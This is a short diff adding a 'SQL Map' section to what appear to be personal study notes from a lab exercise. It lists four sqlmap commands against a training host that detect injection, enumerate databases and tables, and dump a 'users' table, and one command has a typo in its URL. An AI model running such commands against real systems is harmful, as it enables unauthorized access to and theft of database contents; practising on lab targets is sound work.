@@ -50,3 +50,15 @@ It replaces all spaces ( ) with plus signs (+) in the file /tmp/http.bs64. This 
 
 
 
+SQL Map
+sqlmap -u http://sqlmaptesting.thm/search/cat=1
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
+
+
+
+
+
+
+
